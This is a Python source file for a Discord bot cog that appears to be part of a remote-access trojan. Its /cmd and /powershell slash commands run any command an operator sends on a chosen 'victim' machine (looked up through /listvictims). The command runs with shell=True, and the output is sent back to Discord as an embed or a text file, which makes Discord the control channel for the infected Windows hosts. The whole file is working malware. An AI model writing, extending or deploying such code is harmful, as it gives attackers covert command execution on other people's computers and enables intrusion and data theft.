import disnake as discord
from disnake.ext import commands
from datetime import datetime
from io import BytesIO

import os, requests, subprocess, time
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class Shell(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        
    @commands.slash_command( )
    async def cmd(self, ctx, victim, command): 
        """Executes command prompt commands
        
        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        command: The cmd command to be executed
        """
        if str(victim) == str(self.bot.identifier):
            await ctx.response.defer()
            
            output = subprocess.run(
                command, 
                shell=True,
                stdin=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                stdout=subprocess.PIPE, 
            ).stdout.decode('utf-8')
            
            if len(output) > 4095:  
                output_bytes = BytesIO(
                    bytes(
                        output, 'utf-8'
                    )   
                )
                return await ctx.followup.send(
                    file = discord.File(
                        output_bytes, filename = "output.txt"
                    )   
                )       
                
            embed = self.bot.genEmbed(
                f"Output for `{command}`:",
                datetime.now(),
                f"```{output}```"
            )
            await ctx.followup.send(embed=embed)

    @commands.slash_command( )
    async def powershell(self, ctx, victim, command):
        """[EXPERIMENTAL] Executes powershell commands
        
        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        command: The powershell command to be executed
        """
        if str(victim) == str(self.bot.identifier):
            await ctx.response.defer()

            output = subprocess.run(
                f"powershell.exe {command}",
                shell=True,
                stdin=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdout=subprocess.PIPE,
            ).stdout.decode('utf-8')

            if len(output) > 4095:  
                output_bytes = BytesIO(
                    bytes(
                        output, 'utf-8'
                    )   
                )
                return await ctx.followup.send(
                    file = discord.File(
                        output_bytes, filename = "output.txt"
                    )   
                )       

            embed = self.bot.genEmbed(
                f"Output for `{command}`:",
                datetime.now(),
                f"```{output}```"
            )
            await ctx.followup.send(embed=embed)

            
def setup(bot: commands.Bot):
    bot.add_cog(Shell(bot))
